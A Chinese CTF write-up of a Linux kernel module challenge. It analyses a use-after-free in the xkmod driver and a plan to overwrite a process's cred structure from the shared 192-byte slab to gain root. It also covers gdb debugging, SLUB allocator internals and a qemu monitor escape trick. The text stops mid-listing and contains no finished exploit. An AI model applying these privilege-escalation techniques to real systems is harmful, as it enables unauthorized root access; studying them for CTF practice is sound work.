# 2022-RealWorld-CTF(experience competition)-digger_into_kernel

[Attachment](https://github.com/wumingzhilian/wumingzhilian.github.io/blob/master/Digging_into_Kernel_dfe60641bc6185b43a0f9c0932a27f76.tar.xz)

## Check Materials

```
$ xz -d Digging_into_Kernel_dfe60641bc6185b43a0f9c0932a27f76.tar.xz
$ tar xvf Digging_into_Kernel_dfe60641bc6185b43a0f9c0932a27f76.tar
ezkernel/
ezkernel/bzImage
ezkernel/rootfs.cpio
ezkernel/run.sh
ezkernel/pow.py
$ cd ezkernel
$ cat run.sh
qemu-system-x86_64 \
	-kernel bzImage \
	-initrd rootfs.cpio \
	-append "console=ttyS0 root=/dev/ram rdinit=/sbin/init quiet kalsr" \
	-cpu kvm64,+smep,+smap \
	--nographic

```

`run.sh`  is a qemu scripts, argument `-kernel` Use bzImage as kernel image

run.sh 是一个qemu脚本，参数kernel是指定kernel，initrd 指定文件系统，append指定附加参数，包括开启kalsr

+smep +smap 开启了两个保护，一个是禁止ret2user，，一个是禁止RoP链

 为了方便调试，我们可以使用gdb参数，`-gdb tcp::1234` 开启调试端口

run.sh中并没有添加`-monitor null` 因此可以通过先按`ctrl+A`  再输入C，进入monitor模式，（可以进行主机的命令执行相当于逃逸）



![image-20220527223240975](https://cdn.jsdelivr.net/gh/wumingzhilian/image/imgwin/202205272232046.png)

我们解压可以看到四个题目文件，pow.py 用来防止ddos，rootfs.cpio就是提供的文件系统，我们解压，查看文件系统初始化脚本

```
$ cpio -div < rootfs.cpio
$ cat etc/init.d/rcS
#!/bin/sh
mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs none /dev

echo 1 > /proc/sys/kernel/dmesg_restrict
echo 1 > /proc/sys/kernel/kptr_restrict

insmod /xkmod.ko
chmod 644 /dev/xkmod

echo flag{xxxxxxxxx} > /flag
chmod 600 /flag

echo "-------------------------------------------"
echo "|                                         |"
echo "| |~~\|  |  | /~~~~|~~|~~  /~\ /~~\/~\/|  |"
echo "| |__/|  |  ||     |  |--   ,/|    |,/ |  |"
echo "| |__/|  |  ||     |  |--   ,/|    |,/ |  |"
echo "| |  \ \/ \/  \__  |  |    /__ \__//___|_ |"
echo "|                                         |"
echo "-------------------------------------------"


poweroff -d 120 -f &
setsid cttyhack setuidgid 1000 sh

poweroff -f

```

mount用来挂载，echo 1 用来开启内核保护，

dmesg是用来展示内核缓冲区（kernel-ring buffer）内容的,开启保护，非root用户无法读取

kptr保护开启，禁止用户态读取kallsyms 符号表

insmod 用来加载内核驱动，

poweroff 用来关闭系统

setsid 用来设置初始化用户，为了方便调试，我们修改为root用户，同时关闭自动关机，启动脚本如下

```
#!/bin/sh
mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs none /dev

echo 1 > /proc/sys/kernel/dmesg_restrict
echo 1 > /proc/sys/kernel/kptr_restrict

insmod /xkmod.ko
chmod 644 /dev/xkmod

echo flag{xxxxxxxxx} > /flag
chmod 600 /flag

echo "-------------------------------------------"
echo "|                                         |"
echo "| |~~\|  |  | /~~~~|~~|~~  /~\ /~~\/~\/|  |"
echo "| |__/|  |  ||     |  |--   ,/|    |,/ |  |"
echo "| |__/|  |  ||     |  |--   ,/|    |,/ |  |"
echo "| |  \ \/ \/  \__  |  |    /__ \__//___|_ |"
echo "|                                         |"
echo "-------------------------------------------"


#poweroff -d 120 -f &
setsid cttyhack setuidgid 0 sh
#poweroff -f
```



## Vulnerability Analysis

因为本题加载了模块，我们来查看xkmod.xo的情况 我们将xkmod.xo放入ida pro

```
$ checksec xkmod.ko 
[*] '/home/giantbranch/kernel/kernel_for_ctf/ezkernel/xkmod.ko'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x0)

```

同babydriver一样，有一个输入的数据结构和几个函数xkmod_init,xkmod_exit,xkmod_open,xkmod_release,xkmod_ioctl

我们分析xkmod_init xkmod_exit

```
int __cdecl xkmod_init()
{
  kmem_cache *v0; // rax

  printk(&unk_1E4);
  misc_register(&xkmod_device);
  v0 = (kmem_cache *)kmem_cache_create("lalala", 192LL, 0LL, 0LL, 0LL);
  buf = 0LL;
  s = v0;
  return 0;
}
```

xkmod_init 通过register注册驱动，kmem_cache_create 创建堆slab，名字是lalala，大小192 也就是0xc0

xkmod_exit() 打印内核信息，然后销毁驱动

```
void __cdecl xkmod_exit()
{
  printk(&unk_204);
  misc_deregister(&xkmod_device);
}
```

xkmod_release函数对申请的驱动空间进行了释放,但是存在问题，只是把s的空间释放掉，并没有将s指针置为NULL

```
int __fastcall xkmod_release(inode *inode, file *file)
{
  return kmem_cache_free(s, buf);
}
```

分析xkmod_ioctl

```
__int64 __fastcall xkmod_ioctl(__int64 a1, int a2, __int64 a3)
{
  __int64 v4; // [rsp+0h] [rbp-20h] BYREF
  unsigned int v5; // [rsp+8h] [rbp-18h]
  unsigned int v6; // [rsp+Ch] [rbp-14h]
  unsigned __int64 v7; // [rsp+10h] [rbp-10h]

  v7 = __readgsqword(0x28u);
  if ( !a3 )
    return 0LL;
  copy_from_user(&v4, a3, 16LL);
  if ( a2 == 107374182 )
  {
    if ( buf && v6 <= 0x50 && v5 <= 0x70 )
    {
      copy_from_user((char *)buf + (int)v5, v4, (int)v6);
      return 0LL;
    }
  }
  else
  {
    if ( a2 != 125269879 )
    {
      if ( a2 == 17895697 )
        buf = (void *)kmem_cache_alloc(s, 3264LL);
      return 0LL;
    }
    if ( buf && v6 <= 0x50 && v5 <= 0x70 )
    {
      copy_to_user(v4, (char *)buf + (int)v5);
      return 0LL;
    }
  }
  return xkmod_ioctl_cold();
}
```

ioctl是一个系统调用，用于与设备进行通讯，三个参数为

`int ioctl(int fd,unsigned long cmd,unsigned long value)`

我们将代码进行优化,方便查看

```
__int64 __fastcall xkmod_ioctl(__int64 fd, int cmd, __int64 value)
{
  __int64 user_data; // [rsp+0h] [rbp-20h] BYREF
  unsigned int index; // [rsp+8h] [rbp-18h]
  unsigned int len; // [rsp+Ch] [rbp-14h]
  unsigned __int64 v7; // [rsp+10h] [rbp-10h]

  v7 = __readgsqword(0x28u);
  if ( !value )
    return 0LL;
  copy_from_user(&user_data, value, 0x10LL);
  if ( cmd == 0x6666666 )
  {
    if ( buf && len <= 0x50 && index <= 0x70 )
    {
      copy_from_user((char *)buf + (int)index, user_data, (int)len);
      return 0LL;
    }
  }
  else
  {
    if ( cmd != 0x7777777 )
    {
      if ( cmd == 0x1111111 )
        buf = (void *)kmem_cache_alloc(s, 0xCC0LL);
      return 0LL;
    }
    if ( buf && len <= 0x50 && index <= 0x70 )
    {
      copy_to_user(user_data, (char *)buf + (int)index);
      return 0LL;
    }
  }
  return xkmod_ioctl_cold();
}
```

我们接着查看，这里有两个对应的函数，

copy_from_user 实现了将用户空间的数据传送到内核空间 也就是写入数据

copy_to_user 实现了将内核空间的数据传送到用户空间 也就是读取数据

我们查看user_data的具体值 0x10 = dq(0x8)+dd(0x4)+dd(0x4)

````
copy_from_user(&user_data, value, 0x10LL);
````

```
-0000000000000020 user_data dq ?
-0000000000000018 index dd ?
-0000000000000014 len dd ?
-0000000000000010 var_10 dq ?
```

也就是说，这是一个结构体，有三个偏移量

我们继续分析

当cmd == 0x6666666 我们可以向 buf+index写入user_data的数据，长度为len

```
  if ( cmd == 0x6666666 )
  {
    if ( buf && len <= 0x50 && index <= 0x70 )
    {
      copy_from_user((char *)buf + (int)index, user_data, (int)len);
      return 0LL;
    }
  }
```

当cmd==0x11111111 使用kmem_cache_alloc从0xcc0的空闲块中给s分配0xc0空间

```
if ( cmd == 0x1111111 )
        buf = (void *)kmem_cache_alloc(s, 0xCC0LL);
      return 0LL;
```

当cmd==0x7777777 通过copy_to_user 从buf+index中读取数据到user_data中

```
if ( buf && len <= 0x50 && index <= 0x70 )
    {
      copy_to_user(user_data, (char *)buf + (int)index);
      return 0LL;
    }
```

### Trick

https://elixir.bootlin.com/linux/v5.4.38/source/include/linux/sched.h#L878

在内核里，每个进程都会分配 task_struct 结构体

这个结构体包含了，进程信息，结构信息，还有一个 cred结构体

```
	/* Empty if CONFIG_POSIX_CPUTIMERS=n */
	struct posix_cputimers		posix_cputimers;

	/* Process credentials: */

	/* Tracer's credentials at attach: */
	const struct cred __rcu		*ptracer_cred;

	/* Objective and real subjective task credentials (COW): */
	const struct cred __rcu		*real_cred;

	/* Effective (overridable) subjective task credentials (COW): */
	const struct cred __rcu		*cred;
```

cred会存储每个进程的权限信心，uid，gid suid等，

https://elixir.bootlin.com/linux/v5.4.38/source/include/linux/cred.h#L111

```
struct cred {
	atomic_t	usage;
#ifdef CONFIG_DEBUG_CREDENTIALS
	atomic_t	subscribers;	/* number of processes subscribed */
	void		*put_addr;
	unsigned	magic;
#define CRED_MAGIC	0x43736564
#define CRED_MAGIC_DEAD	0x44656144
#endif
	kuid_t		uid;		/* real UID of the task */
	kgid_t		gid;		/* real GID of the task */
	kuid_t		suid;		/* saved UID of the task */
	kgid_t		sgid;		/* saved GID of the task */
	kuid_t		euid;		/* effective UID of the task */
	kgid_t		egid;		/* effective GID of the task */
	kuid_t		fsuid;		/* UID for VFS ops */
	kgid_t		fsgid;		/* GID for VFS ops */
	unsigned	securebits;	/* SUID-less security management */
	kernel_cap_t	cap_inheritable; /* caps our children can inherit */
	kernel_cap_t	cap_permitted;	/* caps we're permitted */
	kernel_cap_t	cap_effective;	/* caps we can actually use */
	kernel_cap_t	cap_bset;	/* capability bounding set */
	kernel_cap_t	cap_ambient;	/* Ambient capability set */
	……

	extern struct cred *prepare_creds(void);
	……
```

`prepare_creds` 这个结构体就是用来申请和生成cred结构的

https://elixir.bootlin.com/linux/v5.4.38/source/kernel/cred.c#L250

```
struct cred *prepare_creds(void)
{
	struct task_struct *task = current;
	const struct cred *old;
	struct cred *new;

	validate_process_creds();

	new = kmem_cache_alloc(cred_jar, GFP_KERNEL);
	if (!new)
		return NULL;

	kdebug("prepare_creds() alloc %p", new);

	old = task->cred;
	memcpy(new, old, sizeof(struct cred));

	new->non_rcu = 0;
	atomic_set(&new->usage, 1);
	set_cred_subscribers(new, 0);
	get_group_info(new->group_info);
	get_uid(new->user);
	get_user_ns(new->user_ns);

#ifdef CONFIG_KEYS
	key_get(new->session_keyring);
	key_get(new->process_keyring);
	key_get(new->thread_keyring);
	key_get(new->request_key_auth);
#endif
……
```

`new = kmem_cache_alloc(cred_jar, GFP_KERNEL);`

通过kmem_cache_alloc申请cred_jar，当前题目的cred_jar大小正好为0XC0 192，同时，他是一个专用slab，

```
/ # cat /proc/slabinfo | grep cred
# name            <active_objs> <num_objs> <objsize> <objperslab> <pagesperslab> : tunables <limit> <batchcount> <sharedfactor> : slabdata <active_slabs> <num_slabs> <sharedavail>
cred_jar             105    105    192   21    1 : tunables    0    0    0 : slabdata      5      5      0

```

也就是说，我们再次申请的slab就是cred_jar 也就是我们可以控制cred_jar的内容，也就是说，我们可以通过开启两个驱动，让他们共用一个buf，然后关闭一个，获取到悬垂指针，并fork子进程，然后修改其cred_jar 这样就可以修改父进程的权限

### Trick 验证

首先我们需要调试，也就是说，我们需要符号表 

```
$ vmlinux-to-elf bzImage vmlinux.elf 
[+] Kernel successfully decompressed in-memory (the offsets that follow will be given relative to the decompressed binary)
[+] Version string: Linux version 5.4.38 (root@8b917a48e929) (gcc version 9.3.0 (Ubuntu 9.3.0-10ubuntu2)) #1 SMP Wed Apr 7 10:16:29 HKT 2021
[+] Guessed architecture: x86_64 successfully in 3.96 seconds
[+] Found kallsyms_token_table at file offset 0x013d9be8
[+] Found kallsyms_token_index at file offset 0x013d9f40
[+] Found kallsyms_markers at file offset 0x013d98b8
[+] Found kallsyms_names at file offset 0x01338150
[+] Found kallsyms_num_syms at file offset 0x01338148
[i] Negative offsets overall: 100 %
[i] Null addresses overall: 0 %
[+] Found kallsyms_offsets at file offset 0x01305260
[+] Successfully wrote the new ELF kernel to vmlinux.elf

```

我们修改run.sh 开放端口,关闭alsr

```
qemu-system-x86_64 \
        -kernel bzImage \
        -initrd rootf2.cpio \
        -append "console=ttyS0 root=/dev/ram rdinit=/sbin/init quiet noalsr" \
        -cpu kvm64,+smep,+smap \
        --nographic \
        --gdb tcp::1234
```

我们将使用root权限进行调试，

```
$ gdb vmlinux.elf 
pwndbg> target remote 127.0.0.1:1234
Remote debugging using 127.0.0.1:1234
0xffffffffae28237e in ?? ()
ERROR: Could not find ELF base!
ERROR: Could not find ELF base!
ERROR: Could not find ELF base!
ERROR: Could not find ELF base!
ERROR: Could not find ELF base!
ERROR: Could not find ELF base!
ERROR: Could not find ELF base!
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────[ REGISTERS ]──────────────────────────────────
 RAX  0xffffffffae282360 ◂— 0xdfe62d8b65555441
 RBX  0x0
 RCX  0x0
 RDX  0x1
 RDI  0x0
 RSI  0x83
 R8   0xffff9cfb0761c980 ◂— 0
 R9   0xf
 R10  0x0
 R11  0x0
 R12  0xffffffffaec11780 ◂— 0x80004000
 R13  0x0
 R14  0x0
 R15  0xffffffffaec11780 ◂— 0x80004000
 RBP  0x0
 RSP  0xffffffffaec03ea0 ◂— 0x0
 RIP  0xffffffffae28237e ◂— mov    ebp, dword ptr gs:[rip + 0x51d8dfcb] /* 0xf51d8dfcb2d8b65 */
───────────────────────────────────[ DISASM ]───────────────────────────────────
 ► 0xffffffffae28237e    mov    ebp, dword ptr gs:[rip + 0x51d8dfcb]
   0xffffffffae282385    nop    dword ptr [rax + rax]
   0xffffffffae28238a    pop    rbx
   0xffffffffae28238b    pop    rbp
   0xffffffffae28238c    pop    r12
   0xffffffffae28238e    ret    
 
   0xffffffffae28238f    mov    eax, dword ptr gs:[rip + 0x51d8dfba]
   0xffffffffae282396    mov    eax, eax
   0xffffffffae282398    bt     qword ptr [rip + 0xac1520], rax
   0xffffffffae2823a0    jae    0xffffffffae282370
    ↓
   0xffffffffae282370    jmp    0xffffffffae28237c
───────────────────────────────────[ STACK ]────────────────────────────────────
00:0000│ rsp  0xffffffffaec03ea0 ◂— 0x0
01:0008│      0xffffffffaec03ea8 —▸ 0xffffffffaec11780 ◂— 0x80004000
... ↓
03:0018│      0xffffffffaec03eb8 —▸ 0xffffffffad89673d ◂— jmp    0xffffffffad896660 /* 0x529e8ffffff1ee9 */
04:0020│      0xffffffffaec03ec0 —▸ 0xffffffffaec11780 ◂— 0x80004000
05:0028│      0xffffffffaec03ec8 ◂— 0x3a /* ':' */
06:0030│      0xffffffffaec03ed0 ◂— 0x4e395c014fd51500
07:0038│      0xffffffffaec03ed8 ◂— 0x0
─────────────────────────────────[ BACKTRACE ]──────────────────────────────────
 ► f 0 ffffffffae28237e
   f 1                0
```

我们来打断点，首先给驱动的prepare_cred打断点，查看地址

```
/ # cat /proc/kallsyms | grep prepare_cred
ffffffffad88a890 T prepare_creds
ffffffffadb3fa60 T security_prepare_creds
/ # cat /proc/kallsyms | grep kmem_cache_alloc
ffffffffad9837b0 T __kmem_cache_alloc_bulk
ffffffffad9c1690 T kmem_cache_alloc
ffffffffad9c1850 T kmem_cache_alloc_trace
ffffffffad9c1a80 T kmem_cache_alloc_node
ffffffffad9c1c60 T kmem_cache_alloc_node_trace
ffffffffad9c22b0 T kmem_cache_alloc_bulk
```


我们在gdb中打下断点

```
pwndbg> b *0xffffffffad88a890
Breakpoint 1 at 0xffffffffad88a890
```

随便执行一个命令，然后si 执行到call函数 也就是`kmem_cache_alloc`

```
0xffffffffad88a8a8 in ?? ()
ERROR: Could not find ELF base!
ERROR: Could not find ELF base!
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────[ REGISTERS ]──────────────────────────────────
 RAX  0xffff9cfb071b1f00 ◂— 4
 RBX  0xffff9cfb05c0a580 ◂— 0
 RCX  0x178
 RDX  0xffffffffaec42e60 ◂— 0x2a00000030 /* '0' */
 RDI  0xffff9cfb07082500 ◂— nop     /* 0x2c090 */
 RSI  0xcc0
 R8   0x2bf98
 R9   0x0
 R10  0x0
 R11  0x2bf40
 R12  0xffff9cfb05c08000 ◂— add    byte ptr [rax], al /* 0x4000 */
 R13  0x0
 R14  0x1200000
 R15  0xffff9cfb05c08000 ◂— add    byte ptr [rax], al /* 0x4000 */
 RBP  0xffffb262401b7e78 ◂— 0x0
 RSP  0xffffb262401b7da8 ◂— 0x1200000
 RIP  0xffffffffad88a8a8 ◂— 0xc0854800136de3e8
───────────────────────────────────[ DISASM ]───────────────────────────────────
   0xffffffffad88a890    push   r12
   0xffffffffad88a892    mov    rdi, qword ptr [rip + 0x1a6f987]
   0xffffffffad88a899    mov    esi, 0xcc0
   0xffffffffad88a89e    push   rbx
   0xffffffffad88a89f    mov    rbx, qword ptr gs:[0x15d00]
 ► 0xffffffffad88a8a8    call   0xffffffffad9c1690
 
   0xffffffffad88a8ad    test   rax, rax
   0xffffffffad88a8b0    je     0xffffffffad88a978
 
   0xffffffffad88a8b6    mov    r8, qword ptr [rbx + 0x638]
   0xffffffffad88a8bd    mov    rdi, rax
   0xffffffffad88a8c0    mov    ecx, 0x15
───────────────────────────────────[ STACK ]────────────────────────────────────
00:0000│ rsp  0xffffb262401b7da8 ◂— 0x1200000
01:0008│      0xffffb262401b7db0 —▸ 0xffff9cfb05c08000 ◂— add    byte ptr [rax], al /* 0x4000 */
02:0010│      0xffffb262401b7db8 —▸ 0xffffffffad88abe5 ◂— 0x840fc08548c58948
03:0018│      0xffffb262401b7dc0 —▸ 0xffffffffad8611f4 ◂— 0x5d5bbf7520fd8348
04:0020│      0xffffb262401b7dc8 —▸ 0xffff9cfb05c0a580 ◂— 0
05:0028│      0xffffb262401b7dd0 —▸ 0xffffb262401b7e78 ◂— 0x0
06:0030│      0xffffb262401b7dd8 —▸ 0xffffb262401b7ef0 ◂— 0x1200000
07:0038│      0xffffb262401b7de0 —▸ 0xffffffffad862acf ◂— 0x4bb880fc085
─────────────────────────────────[ BACKTRACE ]──────────────────────────────────
 ► f 0 ffffffffad88a8a8
   f 1          1200000
   f 2 ffff9cfb05c08000
   f 3 ffffffffad88abe5
   f 4 ffffffffad8611f4
   f 5 ffff9cfb05c0a580
   f 6 ffffb262401b7e78
   f 7 ffffb262401b7ef0
   f 8 ffffffffad862acf
   f 9                3
   f 10 ffffb262401a4000

```

我们可以看到rdi就是分配的地址`0xffff9cfb07082500`

然后我们加载驱动，因为驱动加载会执行kmem_cache_create，我们直接打断点

```
/ # cat /proc/kallsyms | grep kmem_cache_create
ffffffffad982eb0 T kmem_cache_create_usercopy
ffffffffad983120 T kmem_cache_create
ffffffffad983a72 t kmem_cache_create_usercopy.cold
ffffffffad9c4290 T __kmem_cache_create
ffffffffad9c571d t __kmem_cache_create.cold

```

```
pwndbg> b *0xffffffffad983120
Breakpoint 3 at 0xffffffffad983120
```

打好断点我们执行加载驱动

```
/ # insmod xkmod.ko
```

我们在gdb中就可以看到我们的lalala名字，以及我们的返回地址` RAX  0xffff9cfb07082500`

```
pwndbg> c
Continuing.

Breakpoint 3, 0xffffffffad983120 in ?? ()
ERROR: Could not find ELF base!
ERROR: Could not find ELF base!
ERROR: Could not find ELF base!
ERROR: Could not find ELF base!
ERROR: Could not find ELF base!
ERROR: Could not find ELF base!
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────[ REGISTERS ]──────────────────────────────────
 RAX  0x0
 RBX  0x0
 RCX  0x0
 RDX  0x0
 RDI  0xffffffffc0074088 ◂— insb   byte ptr [rdi], dx /* 0x100616c616c616c; 'lalala' */
 RSI  0xc0
 R8   0x0
 R9   0x2
 R10  0xffff9cfb063dc91c ◂— 0x69 /* 'i' */
 R11  0xffff9cfb063dc184 ◂— 0
 R12  0xffff9cfb0639d580 —▸ 0xffff9cfb063f7fc0 —▸ 0xffffffffaea6789b ◂— 0x7365746f6e /* 'notes' */
 R13  0xffff9cfb063f8210 —▸ 0xffff9cfb063f8220 —▸ 0xffff9cfb063f8230 —▸ 0xffff9cfb063f8240 —▸ 0xffff9cfb063f8250 ◂— ...
 R14  0xffffffffc00751d0 —▸ 0xffff9cfb0732bfc8 ◂— 0xffff00646f6d6b78 /* 'xkmod' */
 R15  0xffffffffc0075180 ◂— 1
 RBP  0xffffffffc0078000 ◂— 0xe8c007406fc7c748
 RSP  0xffffb262401a7ca0 —▸ 0xffffffffc0078030 ◂— mov    qword ptr [rip - 0x2b73], 0 /* 0xffffd48d05c748 */
 RIP  0xffffffffad983120 ◂— 0xc03145c931455041
───────────────────────────────────[ DISASM ]───────────────────────────────────
 ► 0xffffffffad983120    push   r8
   0xffffffffad983122    xor    r9d, r9d
   0xffffffffad983125    xor    r8d, r8d
   0xffffffffad983128    call   0xffffffffad982eb0
 
   0xffffffffad98312d    pop    rdx
   0xffffffffad98312e    ret    
 
   0xffffffffad98312f    nop    
   0xffffffffad983130    push   r13
   0xffffffffad983132    mov    r13, rdx
   0xffffffffad983135    push   r12
   0xffffffffad983137    mov    r12, rsi
───────────────────────────────────[ STACK ]────────────────────────────────────
00:0000│ rsp  0xffffb262401a7ca0 —▸ 0xffffffffc0078030 ◂— mov    qword ptr [rip - 0x2b73], 0 /* 0xffffd48d05c748 */
01:0008│      0xffffb262401a7ca8 —▸ 0xffffffffad800c01 ◂— 0x441f0fc58941
02:0010│      0xffffb262401a7cb0 —▸ 0xffffe2fdc0172308 —▸ 0xffffe2fdc0171d48 —▸ 0xffffe2fdc0171288 —▸ 0xffff9cfb07cf85c0 ◂— ...
03:0018│      0xffffb262401a7cb8 ◂— add    byte ptr [rdx], dh /* 0x5d25ec13c3bf3200 */
04:0020│      0xffffb262401a7cc0 ◂— 0x202
05:0028│      0xffffb262401a7cc8 —▸ 0xffffe2fdc01726c0 ◂— 0x100000000000000
06:0030│      0xffffb262401a7cd0 ◂— 0
07:0038│      0xffffb262401a7cd8 —▸ 0xffffffffae27e9b0 ◂— 0xffffffc8e8c3c031
─────────────────────────────────[ BACKTRACE ]──────────────────────────────────
 ► f 0 ffffffffad983120
   f 1 ffffffffc0078030
   f 2 ffffffffad800c01
   f 3 ffffe2fdc0172308
   f 4 5d25ec13c3bf3200
   f 5              202
   f 6 ffffe2fdc01726c0
   f 7                0
Breakpoint *0xffffffffad983120
pwndbg> finish
Run till exit from #0  0xffffffffad983120 in ?? ()
0xffffffffc0078030 in ?? ()
ERROR: Could not find ELF base!
ERROR: Could not find ELF base!
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────[ REGISTERS ]──────────────────────────────────
 RAX  0xffff9cfb07082500 ◂— nop     /* 0x2c090 */
 RBX  0x0
 RCX  0x0
 RDX  0x0
 RDI  0xffffffffaec602a0 ◂— 0x0
 RSI  0xffff9cfb05ca7908 ◂— 1
 R8   0x0
 R9   0x228
 R10  0x0
 R11  0x0
 R12  0xffff9cfb0639d580 —▸ 0xffff9cfb063f7fc0 —▸ 0xffffffffaea6789b ◂— 0x7365746f6e /* 'notes' */
 R13  0xffff9cfb063f8210 —▸ 0xffff9cfb063f8220 —▸ 0xffff9cfb063f8230 —▸ 0xffff9cfb063f8240 —▸ 0xffff9cfb063f8250 ◂— ...
 R14  0xffffffffc00751d0 —▸ 0xffff9cfb0732bfc8 ◂— 0xffff00646f6d6b78 /* 'xkmod' */
 R15  0xffffffffc0075180 ◂— 1
 RBP  0xffffffffc0078000 ◂— 0xe8c007406fc7c748
 RSP  0xffffb262401a7ca8 —▸ 0xffffffffad800c01 ◂— 0x441f0fc58941
 RIP  0xffffffffc0078030 ◂— mov    qword ptr [rip - 0x2b73], 0 /* 0xffffd48d05c748 */
───────────────────────────────────[ DISASM ]───────────────────────────────────
 ► 0xffffffffc0078030    mov    qword ptr [rip - 0x2b73], 0
   0xffffffffc007803b    mov    qword ptr [rip - 0x2b82], rax
   0xffffffffc0078042    xor    eax, eax
   0xffffffffc0078044    ret    
    ↓
   0xffffffffad800c01    mov    r13d, eax
   0xffffffffad800c04    nop    dword ptr [rax + rax]
   0xffffffffad800c09    mov    eax, dword ptr gs:[rip + 0x528150b8]
   0xffffffffad800c10    and    eax, 0x7fffffff
   0xffffffffad800c15    mov    byte ptr [rsp], 0
   0xffffffffad800c19    cmp    eax, ebx
   0xffffffffad800c1b    je     0xffffffffad800c6b
───────────────────────────────────[ STACK ]────────────────────────────────────
00:0000│ rsp  0xffffb262401a7ca8 —▸ 0xffffffffad800c01 ◂— 0x441f0fc58941
01:0008│      0xffffb262401a7cb0 —▸ 0xffffe2fdc0172308 —▸ 0xffffe2fdc0171d48 —▸ 0xffffe2fdc0171288 —▸ 0xffff9cfb07cf85c0 ◂— ...
02:0010│      0xffffb262401a7cb8 ◂— add    byte ptr [rdx], dh /* 0x5d25ec13c3bf3200 */
03:0018│      0xffffb262401a7cc0 ◂— 0x202
04:0020│      0xffffb262401a7cc8 —▸ 0xffffe2fdc01726c0 ◂— 0x100000000000000
05:0028│      0xffffb262401a7cd0 ◂— 0
06:0030│      0xffffb262401a7cd8 —▸ 0xffffffffae27e9b0 ◂— 0xffffffc8e8c3c031
07:0038│      0xffffb262401a7ce0 —▸ 0xffffffffad9c188a ◂— 0x14b850fc085
─────────────────────────────────[ BACKTRACE ]──────────────────────────────────
 ► f 0 ffffffffc0078030
   f 1 ffffffffad800c01
   f 2 ffffe2fdc0172308
   f 3 5d25ec13c3bf3200
   f 4              202
   f 5 ffffe2fdc01726c0
   f 6                0
pwndbg> 

```

和我们的猜想是一致的



### Slub Analysis

内核的slub申请机制也有特殊的地方，我们去申请slub如果已经有同样大小的slub内核就会优先的把有的先分配过来，我们申请的和释放的也就是原有的cred_jar

`kmem_cache_alloc `分配的是专用slub `dedicated cache` or `special cache`，`kmalloc`分配的是通用slub，`general cache` or `general purpose cache`

这两种cache是不能交叉使用的， 

也就是说cred_jar和kmalloc-192是分离的

```
4.4.72

/*
 * initialise the credentials stuff
 */
void __init cred_init(void)
{
    /* allocate a slab in which we can store credentials */
    cred_jar = kmem_cache_create("cred_jar", sizeof(struct cred),
                     0, SLAB_HWCACHE_ALIGN|SLAB_PANIC, NULL);
}
4.5

/*
 * initialise the credentials stuff
 */
void __init cred_init(void)
{
    /* allocate a slab in which we can store credentials */
    cred_jar = kmem_cache_create("cred_jar", sizeof(struct cred), 0,
            SLAB_HWCACHE_ALIGN|SLAB_PANIC|SLAB_ACCOUNT, NULL);
}
```

在kernel 4.4.74版本和kernel 4.5 版本的对比中，可以发现在slab创建的时候，锁了一个`SLAB_ACCOUNT` 也就是意味着cred_jar 与kmalloc-192 不会再合并



#### 分配机制

从最开始的`kmem_cache`创建上来说，相比于`slab`的无脑创建新的`kmem_cache`带来的开销，`slub`引入了`对象重用`的机制，即在请求创建新的`kmem_cache`时，分配器会根据`size`搜索已有的`kmem_cache`，若相等或是略大于(sizeof(void *)范围)则不去创建而是重新已有的`kmem_cache`，将其`refcount + 1`，在后续初始化上也有变化，用`kmem_cache_cpu`取代以前的`array_cache`。

原本的`slab`顺序 是`本地缓冲池 -> 共享缓冲池 -> 部分空闲链表 -> 全部空闲链表`

`slub` 则取消了共享缓冲池，保留了部分空闲链表，同样在第一次内存分配的时候没有`slab`，这时候就要为当前`cpu`创建一个`slab`称为`本地活动slab`，并将`kmem_cache_cpu`的`freelist`指向第一个`object`，这样再次`retry`时则只需要使用指向的`object`然后移动指针即可分配出一个可用的`object`出来

而如果`本地活动slab`已经没有`空闲object`的话，则从`kmem_cache_cpu->partial`取新的`slab`重新装到`freelist`上，其中`kmem_cache_cpu->page`就指向的当前在用的`slab`

如果此时`kmem_cache_cpu->partial`上没有了空闲的`slab`则从`kmem_cache_node->partial`上取`slab`装到`freelist`上，

会多取几个放到`kmem)_cache_cpu->partial`上，为下次寻找节省时间，

这种方式比起`slab`机制来说要简单高效了很多，当然如果都没有`object`的话则直接申请新的`slab`。

#### 回收机制

如果要释放的`object`正是`本地活动slab`上的话，则直接将其添加到当前`freelist链表`的头部，然后将`freelist`移动到该`object`，但是如果要释放的`object`属于其余`slab`中的话，则将其释放后加入到`slab`的空闲队列里，然后还要判断释放后的`slab`状态，然后再根据情况整个销毁掉`全空闲slab`或者移动到不同的链表中。

#### slub结构

![image-20220604221538496](https://cdn.jsdelivr.net/gh/wumingzhilian/image/imgwin/202206042215779.png)



#### kmalloc

在系统启动的时候，就有`create_kmalloc_caches`创建了一堆`slab描述符`

```
static __always_inline void *kmalloc(size_t size, gfp_t flags)
{
 if (__builtin_constant_p(size)) {
  if (size > KMALLOC_MAX_CACHE_SIZE)
   return kmalloc_large(size, flags);
#ifndef CONFIG_SLOB
  if (!(flags & GFP_DMA)) {
   unsigned int index = kmalloc_index(size);


   if (!index)
    return ZERO_SIZE_PTR;


   return kmem_cache_alloc_trace(kmalloc_caches[index],
     flags, size);
  }
#endif
 }
 return __kmalloc(size, flags);
}
```

会根据index来决定最终分配的内存来源于哪个cache

```
static __always_inline unsigned int kmalloc_index(size_t size)
{
 if (!size)
  return 0;


 if (size <= KMALLOC_MIN_SIZE)
  return KMALLOC_SHIFT_LOW;


 if (KMALLOC_MIN_SIZE <= 32 && size > 64 && size <= 96)
  return 1;
 if (KMALLOC_MIN_SIZE <= 64 && size > 128 && size <= 192)
  return 2;
 if (size <= 8) return 3;
 if (size <= 16) return 4;
 if (size <= 32) return 5;
 if (size <= 64) return 6;
 if (size <= 128) return 7;
 if (size <= 256) return 8;
 if (size <= 512) return 9;
 if (size <= 1024) return 10;
 if (size <= 2 * 1024) return 11;
 if (size <= 4 * 1024) return 12;
 if (size <= 8 * 1024) return 13;
 if (size <= 16 * 1024) return 14;
 if (size <= 32 * 1024) return 15;
 if (size <= 64 * 1024) return 16;
 if (size <= 128 * 1024) return 17;
 if (size <= 256 * 1024) return 18;
